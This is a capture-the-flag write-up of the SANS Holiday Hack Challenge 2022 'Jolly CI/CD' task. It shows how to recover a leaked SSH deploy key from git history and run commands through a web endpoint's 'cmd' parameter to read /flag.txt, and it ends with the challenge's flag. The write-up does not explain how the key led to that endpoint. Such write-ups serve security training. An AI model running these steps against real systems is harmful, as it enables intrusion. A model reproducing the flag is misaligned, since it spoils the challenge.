# Recover the Elfen Ring: Jolly CI/CD  
**SANS Holiday Hack Challenge 2022 – KringleCon V: Golden Rings**  
**Difficulty:** 🎄🎄🎄🎄🎄

## Overview  
This challenge focused on exploiting a misconfigured CI/CD pipeline. By reviewing commit history and examining leftover credentials, I was able to impersonate a developer, interact with a remote service, and uncover the flag.

---

## Steps Performed

### 1. Clone the Repository  
Tinsel Upatree referenced a GitLab repo:
```
http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```
I cloned it locally and began reviewing the Git history.

---

### 2. Analyze Git Log for Mistakes  
Running `git log`, I found a suspicious commit labeled `whoops`. This commit occurred just before a `.ssh/.deploy` file was deleted, which seemed like a mistake.

```bash
git log
git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5
```

The diff revealed that a **private SSH deploy key** had been removed in that commit — suggesting it was unintentionally added before.

---

### 3. Exploit the Web Server  
Using the leaked key, I interacted with `wordpress.flag.net.internal`, a CI/CD-managed site.

I verified I could execute commands via the server:

```bash
wget "wordpress.flag.net.internal?cmd=whoami" -q -O -
# Output: www-data
```

This confirmed command execution through the web interface.

---

### 4. Locate the Flag  
I searched the filesystem for any references to "flag":

```bash
wget "wordpress.flag.net.internal?cmd=find /* 2>/dev/null | grep flag" -q -O -
```

A promising result: `/flag.txt`.

---

### 5. Retrieve the Flag Contents  
Using another HTTP request, I dumped the contents of `/flag.txt`:

```bash
wget "wordpress.flag.net.internal?cmd=cat /flag.txt" -q -O -
```

Amid celebratory ASCII art, I found the solution string:

```
oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
```

---

## Outcome  
By reviewing commit history and identifying an exposed private SSH key, I was able to access a misconfigured CI/CD endpoint, execute arbitrary commands, and extract the final flag from the host system.

**Final Answer:**  
```
oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
```
